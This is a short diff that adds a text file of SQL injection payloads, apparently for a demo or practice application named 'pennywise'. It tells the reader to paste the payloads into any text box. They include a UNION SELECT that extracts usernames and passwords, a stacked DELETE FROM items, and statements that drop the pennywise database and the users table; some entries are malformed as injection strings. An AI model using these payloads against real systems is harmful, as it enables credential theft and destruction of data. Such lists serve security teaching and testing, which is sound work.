@@ -1,0 +1,28 @@
+Copy any of the below SQL , or create your own, and paste into any text box.
+
+- Get all users:
+
+' UNION SELECT username, password FROM users--
+
+
+- Delete all users bills:
+
+SELECT * FROM users
+WHERE bill = ''
+AND amount = 'name';
+
+DELETE FROM items;
+
+--'
+
+
+- Drop pennywise database:
+
+USE MASTER
+GO
+DROP DATABASE IF EXISTS pennywise
+
+
+- Drop all users:
+
+DROP TABLE IF EXISTS users
